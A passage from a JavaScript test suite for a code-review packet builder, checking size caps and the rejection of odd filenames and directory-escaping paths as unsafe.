    const input = fixture(context, { 'a.ts': '12345\n', 'b.ts': '12345\n', 'c.ts': '12345\n' }, { 'a.ts': 'abcde\n' });
    const plan = await buildPlan({ ...input, maxTotalCopyBytes: 12 });
    const regenerated = await buildPlan({ ...input, maxTotalCopyBytes: 12 });
    assert.equal(plan.digest, regenerated.digest);
    assert.equal(plan.context.find((entry) => entry.path === 'c.ts').reason, 'context-total-size-cap');
    assert.equal(plan.context.filter((entry) => !entry.reason).reduce((total, entry) => total + entry.size, 0), 12);
    const packetDir = join(input.repoDir, '.codex-review-input');
    const promptPath = renderPacket({ ...input, plan, chunkId: plan.chunks[0].id, expectedDigest: plan.digest, packetDir });
    assert.equal(existsSync(join(packetDir, 'head/c.ts')), false);
    assert.match(readFileSync(promptPath, 'utf8'), /context-total-size-cap/);
    assert.match(readFileSync(promptPath, 'utf8'), /c.ts/);
  });

  for (const oddName of ['tab\tname.ts', 'line\nname.ts', 'back\\slash.ts', 'colon:name.ts']) {
    test(`fails closed for an odd unchanged HEAD filename ${JSON.stringify(oddName)}`, async (context) => {
      const input = fixture(context, { [oddName]: 'unchanged\n', 'api.ts': 'old\n' }, { 'api.ts': 'new\n' });
      await assert.rejects(() => buildPlan(input), /Unsafe packet path/);
    });
  }

  test('rejects absolute and parent-escaping paths before they can enter a packet', () => {
    for (const path of ['/outside.ts', '../outside.ts', 'safe/../../outside.ts', 'C:/outside.ts']) {
      assert.throws(() => parseNumstat(`1\t0\t${path}\0`), /Unsafe packet path/);
    }
  });
});
